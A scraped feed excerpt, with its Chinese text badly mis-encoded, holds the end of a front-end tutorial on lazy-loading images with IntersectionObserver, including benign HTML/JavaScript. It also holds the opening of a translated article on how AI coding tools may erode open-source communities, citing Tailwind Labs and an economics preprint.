<h4 data-id="heading-11">åˆ›å»ºè§‚å¯Ÿå™¨å®ä¾‹</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e11404e2b1e452598013cbf6d338685~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=VGe7pR0WnyYptd6BcrSB8%2BFMxjE%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>item.isIntersecting</strong> :Â å¸ƒå°”å€¼ï¼Œç›´æ¥è¡¨ç¤ºå…ƒç´ æ˜¯å¦è¿›å…¥è§†å£ï¼ˆæ— éœ€æ‰‹åŠ¨è®¡ç®—ä½ç½®ï¼‰ã€‚</li>
<li><strong>item.target</strong> :Â å½“å‰è¢«è§‚å¯Ÿçš„ DOM å…ƒç´ ï¼ˆå³å›¾ç‰‡ï¼‰ã€‚</li>
<li><strong>io.unobserve(item.target)</strong> :Â åœæ­¢å¯¹å·²åŠ è½½å›¾ç‰‡çš„è§‚å¯Ÿï¼Œé¿å…ä¸å¿…è¦çš„èµ„æºæ¶ˆè€—ã€‚</li>
</ul>
<h4 data-id="heading-12">æ‰¹é‡è§‚å¯Ÿå¾…åŠ è½½å›¾ç‰‡</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7943ccf93e5240839876536ccaa6c928~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP6YeR6bG8WQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770381055&amp;x-signature=beANz%2BfgWR%2BgGWXCBbLZpeqrKwg%3D" alt="image.png" loading="lazy"/></p>
<p>å°†é¡µé¢ä¸­æ‰€æœ‰æ ‡è®°ä¸ºÂ <code>lazyload</code>Â çš„å›¾ç‰‡æ³¨å†Œåˆ°è§‚å¯Ÿå™¨ä¸­ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ç›‘å¬å®ƒä»¬çš„è§†å£å¯è§æ€§å˜åŒ–ã€‚</p>
<h4 data-id="heading-13">å®Œæ•´ä»£ç ï¼š</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-tag">img</span> {
            <span class="hljs-attribute">display</span>: block;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">""</span> <span class="hljs-attr">lazyload</span>=<span class="hljs-string">"true"</span> <span class="hljs-attr">data-origin</span>=<span class="hljs-string">"å›¾ç‰‡åœ°å€"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- å¤šå¼ å›¾ç‰‡çœç•¥ --&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">const</span> io = <span class="hljs-keyword">new</span> <span class="hljs-title class_">IntersectionObserver</span>(
            <span class="hljs-function">(<span class="hljs-params">entries</span>) =&gt;</span> {
                entries.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
                    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">isIntersecting</span>) {
                        item.<span class="hljs-property">target</span>.<span class="hljs-property">src</span> = item.<span class="hljs-property">target</span>.<span class="hljs-property">dataset</span>.<span class="hljs-property">origin</span>
                        item.<span class="hljs-property">target</span>.<span class="hljs-title function_">removeAttribute</span>(<span class="hljs-string">'lazyload'</span>)
                        io.<span class="hljs-title function_">unobserve</span>(item.<span class="hljs-property">target</span>)
                    }
                })
            }
        )

        <span class="hljs-keyword">const</span> imgs = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'img[lazyload]'</span>)
        imgs.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">img</span> =&gt;</span> {
                io.<span class="hljs-title function_">observe</span>(img)
            }
        )
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼šæ€§èƒ½æœ€ä¼˜ï¼šæµè§ˆå™¨å¼‚æ­¥å¤„ç†ï¼Œä¸é˜»å¡ä¸»çº¿ç¨‹ã€‚ä»£ç æç®€ï¼šæ— éœ€æ‰‹åŠ¨è®¡ç®—ä½ç½®æˆ–å¤„ç†æ»šåŠ¨ï¼›è‡ªåŠ¨åœæ­¢è§‚å¯Ÿï¼šåŠ è½½åç«‹å³è§£é™¤ç›‘å¬ï¼ŒèŠ‚çœèµ„æºã€‚</p>
<p><strong>ç¼ºç‚¹</strong>ï¼šå…¼å®¹æ€§æœ‰é™ï¼š<code>IE æµè§ˆå™¨ä¸æ”¯æŒ</code>ï¼ˆéœ€é™çº§æ–¹æ¡ˆï¼‰</p>
<h2 data-id="heading-14">æ€»ç»“</h2>
<p>æ‡’åŠ è½½æŠ€æœ¯ä½œä¸ºä¼˜åŒ–ç½‘é¡µæ€§èƒ½çš„æœ‰æ•ˆæ‰‹æ®µï¼Œåœ¨æå‡ç”¨æˆ·ä½“éªŒæ–¹é¢å‘æŒ¥ç€é‡è¦ä½œç”¨ã€‚ä»åŸç†ä¸Šçœ‹ï¼Œå®ƒæŒ‰éœ€åŠ è½½å›¾ç‰‡ï¼Œé¿å…èµ„æºæµªè´¹ï¼Œæ˜¾è‘—å‡å°‘é¡µé¢åˆå§‹åŠ è½½æ—¶é—´ã€‚</p>
<p>åŸç”ŸJavaScriptæ–¹æ¡ˆå‡­å€ŸåŸºç¡€<code>DOMæ“ä½œä¸äº‹ä»¶ç›‘å¬</code>ï¼Œå…·å¤‡è‰¯å¥½å…¼å®¹æ€§ä¸çµæ´»æ€§ï¼Œè™½éœ€æ‰‹åŠ¨å¤„ç†ç»†èŠ‚ï¼Œä½†èƒ½ç²¾å‡†æŠŠæ§åŠ è½½é€»è¾‘ï¼›</p>
<p><code>Intersection Observer</code>åˆ™æ›´ä¸ºç®€æ´é«˜æ•ˆï¼Œè‡ªåŠ¨ç›‘å¬å…ƒç´ å¯è§æ€§ï¼Œå¤§å¹…é™ä½å¼€å‘å·¥ä½œé‡ï¼Œä¸”æ€§èƒ½è¡¨ç°å‡ºè‰²ã€‚</p>
<p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¼€å‘è€…å¯ä¾æ®é¡¹ç›®éœ€æ±‚ã€æµè§ˆå™¨å…¼å®¹æ€§ç­‰å› ç´ çµæ´»é€‰æ‹©ã€‚éšç€äº’è”ç½‘å¯¹æ€§èƒ½è¦æ±‚æŒç»­æå‡ï¼Œæ‡’åŠ è½½æŠ€æœ¯å°†ä¸æ–­æ¼”è¿›ï¼Œä¸ºæ‰“é€ æ›´æµç•…ã€é«˜æ•ˆçš„ç½‘é¡µä½“éªŒè´¡çŒ®åŠ›é‡ âœ¨ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å½“AIç¼–ç¨‹æˆä¸ºç¨‹åºå‘˜çš„ç¬¬ä¸€é€‰æ‹©ï¼Œå¼€æºç¤¾åŒºæ­£èµ°å‘æ­»äº¡ï¼]]></title>    <link>https://juejin.cn/post/7600986495927271465</link>    <guid>https://juejin.cn/post/7600986495927271465</guid>    <pubDate>2026-01-31T02:23:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600986495927271465" data-draft-id="7600989427906052150" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å½“AIç¼–ç¨‹æˆä¸ºç¨‹åºå‘˜çš„ç¬¬ä¸€é€‰æ‹©ï¼Œå¼€æºç¤¾åŒºæ­£èµ°å‘æ­»äº¡ï¼"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIç¼–ç¨‹,Trae"/> <meta itemprop="datePublished" content="2026-01-31T02:23:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€”å¼ºé’é“œä¸‰"/> <meta itemprop="url" content="https://juejin.cn/user/2942757076730455"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å½“AIç¼–ç¨‹æˆä¸ºç¨‹åºå‘˜çš„ç¬¬ä¸€é€‰æ‹©ï¼Œå¼€æºç¤¾åŒºæ­£èµ°å‘æ­»äº¡ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2942757076730455/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€”å¼ºé’é“œä¸‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T02:23:33.000Z" title="Sat Jan 31 2026 02:23:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theregister.com%2F2026%2F01%2F26%2Fvibe_coding_hazardous_open_source%2F" target="_blank" title="https://www.theregister.com/2026/01/26/vibe_coding_hazardous_open_source/" ref="nofollow noopener noreferrer">www.theregister.com/2026/01/26/â€¦</a><br/>
ä½œè€…ï¼š The Register<br/>
è¯‘è€…ï¼š å€”å¼ºé’é“œä¸‰</p>
<h2 data-id="heading-0">å‰è¨€</h2>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯<strong>å€”å¼ºé’é“œä¸‰</strong>ã€‚æ¬¢è¿å…³æ³¨æˆ‘ï¼Œ<strong>å¾®ä¿¡å…¬ä¼—å·ï¼šå€”å¼ºé’é“œä¸‰</strong>ã€‚æ¬¢è¿ç‚¹èµã€æ”¶è—ã€å…³æ³¨ï¼Œä¸€é”®ä¸‰è¿ï¼ï¼ï¼</p>
<p>Tailwind Labs CEO Adam Wathan æœ€è¿‘æŒ‡è´£ AI è¿«ä½¿å…¬å¸è§£é›‡äº†ä¸‰åå‘˜å·¥ã€‚</p>
<p>Tailwind Labs è´Ÿè´£å¼€æº Tailwind CSS æ¡†æ¶çš„å¼€å‘ã€‚æ® Wathan ç§°ï¼ŒAI ç¼–ç¨‹å·¥å…·åœ¨å…¬å¸ä¸å®¢æˆ·ä¹‹é—´æ¶èµ·äº†ä¸€é“å±éšœï¼Œå¯¼è‡´ç½‘ç«™æµé‡ä¸‹é™ï¼Œè¿›è€Œå½±å“äº†äº§å“æ›å…‰åº¦ã€‚</p>
<p>"å°½ç®¡ Tailwind æ¯”ä»¥å¾€ä»»ä½•æ—¶å€™éƒ½æ›´å—æ¬¢è¿ï¼Œä½†è‡ª 2023 å¹´åˆä»¥æ¥ï¼Œæˆ‘ä»¬æ–‡æ¡£çš„è®¿é—®é‡ä¸‹é™äº†çº¦ 40%ï¼Œ" ä»–æœ¬æœˆåœ¨ GitHub Issues å¸–å­ä¸­å†™é“ã€‚"æ–‡æ¡£æ˜¯äººä»¬äº†è§£æˆ‘ä»¬å•†ä¸šäº§å“çš„å”¯ä¸€é€”å¾„ï¼Œæ²¡æœ‰å®¢æˆ·ï¼Œæˆ‘ä»¬å°±æ— æ³•æ‰¿æ‹…ç»´æŠ¤æ¡†æ¶çš„è´¹ç”¨ã€‚"</p>
<p>æœ€è¿‘çš„ä¸€ç¯‡é¢„å°æœ¬è®ºæ–‡å¼•ç”¨äº† Tailwind Labs çš„æƒ…å†µä½œä¸ºè¯æ®ï¼Œè¯æ˜ AI ç¼–ç¨‹å·¥å…·çš„æ—¥ç›Šé‡‡ç”¨ä»£è¡¨äº†å¼€æºç¤¾åŒºçš„ä¸€ä¸ªç ´åæ€§å˜é©ã€‚</p>
<p>è¿™ç¯‡é¢˜ä¸ºã€Šæ°›å›´ç¼–ç¨‹æ‰¼æ€å¼€æºã€‹çš„è®ºæ–‡ç”± MiklÃ³s Korenï¼ˆä¸­æ¬§å¤§å­¦ã€KRTKã€CEPR å’Œ CESifoï¼‰ã€GÃ¡bor BÃ©kÃ©sï¼ˆä¸­æ¬§å¤§å­¦ã€KRTK å’Œ CEPRï¼‰ã€Julian Hinzï¼ˆæ¯”å‹’è´¹å°”å¾·å¤§å­¦å’ŒåŸºå°”ä¸–ç•Œç»æµç ”ç©¶æ‰€ï¼‰å’Œ Aaron Lohmannï¼ˆåŸºå°”ä¸–ç•Œç»æµç ”ç©¶æ‰€ï¼‰å…±åŒæ’°å†™ã€‚</p>
<p>æœ¬è´¨ä¸Šï¼Œè¿™ç¯‡è®ºæ–‡è®¤ä¸ºï¼ŒAI å·¥å…·ä»¥æŸç§æ–¹å¼å®‰è£…å¼€æºä¾èµ–ï¼Œå°†è½¯ä»¶å¼€å‘äººå‘˜ä¸é¡¹ç›®ç»´æŠ¤è€…éš”ç¦»å¼€æ¥ï¼Œç ´åäº†é‚£äº›å¯èƒ½ä¸ºè½¯ä»¶ç»´æŠ¤å·¥ä½œå¸¦æ¥å›æŠ¥çš„äº’åŠ¨ã€‚</p>
<p>"æ°›å›´ç¼–ç¨‹é€šè¿‡é™ä½ä½¿ç”¨å’ŒåŸºäºç°æœ‰ä»£ç æ„å»ºçš„æˆæœ¬æ¥æé«˜ç”Ÿäº§åŠ›ï¼Œä½†å®ƒä¹Ÿå‰Šå¼±äº†è®¸å¤šç»´æŠ¤è€…è·å¾—å›æŠ¥çš„ç”¨æˆ·å‚ä¸åº¦ï¼Œ" ä½œè€…ä»¬æŒ‡å‡ºã€‚"å½“å¼€æºè½¯ä»¶ä»…é€šè¿‡ç›´æ¥ç”¨æˆ·å‚ä¸å®ç°è´§å¸åŒ–æ—¶ï¼Œæ°›å›´ç¼–ç¨‹çš„æ›´å¹¿æ³›é‡‡ç”¨ä¼šé™ä½å‚ä¸åº¦å’Œåˆ†äº«ï¼Œå‡å°‘å¼€æºè½¯ä»¶çš„å¯ç”¨æ€§å’Œè´¨é‡ï¼Œå°½ç®¡ç”Ÿäº§åŠ›æ›´é«˜ï¼Œä½†ç¦åˆ©å´é™ä½äº†ã€‚"</p>
<p>è®ºæ–‡åˆè‘—è€…ã€å¥¥åœ°åˆ©ç»´ä¹Ÿçº³ä¸­æ¬§å¤§å­¦ç»æµå­¦æ•™æˆ Koren åœ¨ç»™ The Register çš„ç”µå­é‚®ä»¶ä¸­è¡¨ç¤ºï¼ŒAI å·¥å…·å‰Šå¼±ä¸å¼€æºç¤¾åŒºå‚ä¸åº¦çš„è¯æ®å¤§å¤šæ˜¯é—´æ¥çš„ã€‚</p>
<p>"ChatGPT å‘å¸ƒåï¼ŒStack Overflow çš„é—®é¢˜æ•°é‡æœ‰è®°å½•çš„ä¸‹é™ï¼›è€Œä¸”åœ¨ ChatGPT æ— æ³•è®¿é—®çš„å›½å®¶ï¼Œè¿™ç§ä¸‹é™é€Ÿåº¦æ›´å¿«ï¼Œ"ä»–è¯´ã€‚"ç¤¾äº¤åª’ä½“ä¸Šæµä¼ ç€è®¸å¤šç±»ä¼¼çš„è½¶äº‹ã€‚äº‹å®ä¸Šï¼Œåœ¨ Tailwind çš„æ¡ˆä¾‹è¢«å…¬å¼€ä¹‹å‰ï¼Œæˆ‘ä»¬å°±å·²ç»å¼€å§‹æ’°å†™è¿™ç¯‡è®ºæ–‡äº†ã€‚"</p>
<p>Koren è¡¨ç¤ºï¼Œè®ºæ–‡çš„å‘ç°ä»£è¡¨äº†ä»–å’Œåˆè‘—è€…æ ¹æ®å¼€æºè½¯ä»¶ç”Ÿæ€ç³»ç»Ÿçš„ç»æµæ¨¡å‹æ‰€äº†è§£æƒ…å†µçš„æ¨æ¼”ã€‚</p>
<p>"æˆ‘ä»¬çŸ¥é“å¼€å‘è€…éå¸¸å¿«åœ°é‡‡ç”¨äº†æ°›å›´ç¼–ç¨‹ï¼Œ"ä»–è¯´ã€‚[Anthropic CEO] Dario Amodei åœ¨ 2025 å¹´ 9 æœˆçš„ Axios AI+ å³°ä¼šä¸Šæ›¾è‘—ååœ°è¡¨ç¤ºï¼Œ'åœ¨ Anthropic ç¼–å†™çš„ä»£ç ä¸­ï¼Œ70%ã€80%ã€90% æ˜¯ç”± Claude ç¼–å†™çš„ã€‚'å› æ­¤ï¼Œæ°›å›´ç¼–ç¨‹çš„ç”¨æˆ·å¾ˆå®¹æ˜“åˆ‡æ¢åˆ°è¿™ç§è½¯ä»¶å¼€å‘æ¨¡å¼ã€‚è¿™æ„å‘³ç€äººç±»å¯¹å¼€æºè½¯ä»¶ç”Ÿäº§è€…çš„å…³æ³¨æ­£åœ¨å‡å°‘ã€‚"</p>
<ul>
<li>ä¸€ä½å¼€å‘è€…å¦‚ä½•ä½¿ç”¨ Claude æ„å»ºäº† C è¯­è¨€çš„å†…å­˜å®‰å…¨æ‰©å±•</li>
<li>Claude ç°åœ¨å¯ä»¥ä»å…¶ä»–åº”ç”¨ç¨‹åºä¸­æå–ç•Œé¢å…ƒç´ </li>
<li>Gallup ç§°ï¼Œå·¥ä½œä¸­ AI çš„é‡‡ç”¨åœ¨ç¬¬å››å­£åº¦é™·å…¥åœæ»</li>
<li>Oracle AI é€šè¿‡è¾¹ç¼˜äº‘å¥—ä»¶åœ¨çš‡å®¶æµ·å†›æ——èˆ°ä¸Šç¯çƒèˆªè¡Œ</li>
</ul>
<p>Koren è¡¨ç¤ºï¼Œè¿™ç§æ³¨æ„åŠ›è½¬ç§»çš„å½±å“ä¸ä»…ä»¥æ”¶å…¥æ¥è¡¡é‡ã€‚ç›¸åï¼Œå®ƒè¢«è¯„ä¼°ä¸ºå¼€æºå¼€å‘è€…å¯è·å¾—çš„å„ç§å¥–åŠ±çš„ç»¼åˆï¼Œå¦‚ç¤¾åŒºè®¤å¯ã€å£°èª‰å’ŒèŒä¸šå‰æ™¯ï¼Œä»–æŒ‡å‡ºæœ€è¿‘çš„ä¸€ç¯‡è®ºæ–‡ [PDF] å‘ç°"å¼€æºå¼€å‘è€…åˆ›é€ çš„æ€»ä»·å€¼ä¸­ï¼Œåªæœ‰çº¦ 0.1% è¢«ä»–ä»¬è‡ªå·±è·å¾—ã€‚"</p>
<p>Koren è¡¨ç¤ºï¼ŒAI å·¥å…·é‡‡ç”¨çš„å½±å“å› é¡¹ç›®çš„è§„æ¨¡å’Œæ²»ç†è€Œå¼‚ã€‚</p>
<p>"é«˜è´¨é‡çš„é¡¹ç›®ä»ç„¶å¯ä»¥è“¬å‹ƒå‘å±•ï¼Œ"ä»–è¯´ã€‚"å¼€æºè½¯ä»¶å¼€å‘è€…éœ€è¦å…¶é¡¹ç›®çš„å¯è§æ€§ï¼Œä»¥ä»ç”¨æˆ·é‚£é‡Œæ”¶é›†æœ‰ç”¨çš„åé¦ˆï¼Œæ‹›å‹Ÿæ–°çš„å¼€å‘è€…å’Œç»´æŠ¤è€…ï¼Œå¹¶ä»ç¤¾åŒºä¸­è·å¾—èµèª‰ã€‚æˆ‘ä»¬ä¸è®¤ä¸ºå¤§å‹å¼€æºé¡¹ç›®ä¼šä¸€å¤œä¹‹é—´æ¶ˆå¤±ã€‚ä½†è¦è¶…è¶Š'å†·å¯åŠ¨é—®é¢˜'å¹¶è®©ä¸€ä¸ªåŸæœ¬æœ‰å¸Œæœ›çš„é¡¹ç›®èµ·æ­¥ä¼šå˜å¾—æ›´åŠ å›°éš¾ã€‚æˆ–è€…ï¼Œå‹‰å¼ºæˆåŠŸçš„é¡¹ç›®çš„ç»´æŠ¤è€…å¯èƒ½ä¼šå¤±å»åŠ¨åŠ›å¹¶åœæ­¢è´¡çŒ®ã€‚ä¼ è¯´ä¸­çš„'å†…å¸ƒæ‹‰æ–¯åŠ å·çš„éšæœºäººå£«'å¯èƒ½ä¼šæ”¾å¼ƒã€‚"</p>
<p>Koren è¡¨ç¤ºï¼Œè¿™æ˜¯ä¸€ä¸ªéœ€è¦è¡Œä¸šé›†ä½“è¡ŒåŠ¨çš„ç³»ç»Ÿæ€§é—®é¢˜ã€‚</p>
<p>"ä¼ ç»Ÿä¸Šï¼Œå¼€æºè½¯ä»¶å·¥ä½œæ²¡æœ‰ç›´æ¥å¾—åˆ°ç”¨æˆ·çš„è¡¥å¿ï¼Œä¸æ˜¯å› ä¸ºä»–ä»¬ä¸é‡è§†å¼€æºè½¯ä»¶ï¼Œè€Œæ˜¯å› ä¸ºæ¶‰åŠçš„æ‘©æ“¦ï¼Œ"ä»–è§£é‡Šè¯´ã€‚"å¯¹äºä»»ä½•ç»™å®šé¡¹ç›®ï¼Œæˆ‘å¯èƒ½ä¼šä½¿ç”¨å‡ åä¸ªåº“ã€‚æˆ‘ä¸ä¼šæŸ¥æ‰¾æ¯ä¸ªå•ç‹¬çš„ç»´æŠ¤è€…å¹¶ç»™ä»–ä»¬å‡ åˆ†ä¹‹ä¸€ç¾åˆ†ã€‚GitHub æˆ– npm æœ‰æ­£åœ¨è¿›è¡Œçš„èµ„åŠ©æ´»åŠ¨ï¼Œä½†è¿™äº›å¹¶ä¸èƒ½è§£å†³é—®é¢˜ï¼Œå› ä¸ºå®ƒä»¬ä»ç„¶éœ€è¦ç”¨æˆ·å…³æ³¨å¹¶æ‰“å¼€é’±åŒ…ã€‚"</p>
<p>ä½† AI å…¬å¸å¯ä»¥æä¾›å¸®åŠ©ï¼ŒKoren è®¤ä¸ºï¼Œä»–æŒ‡å‡ºå¤§å¤šæ•° LLM æ¨ç†ç”±å°‘æ•°å¤§å‹æä¾›å•†ï¼ˆå¦‚ OpenAIã€Anthropicï¼‰æˆ–ç¬¬ä¸‰æ–¹æä¾›å•†ï¼ˆå¦‚ OpenRouter å’Œ Groqï¼‰å®Œæˆã€‚</p>
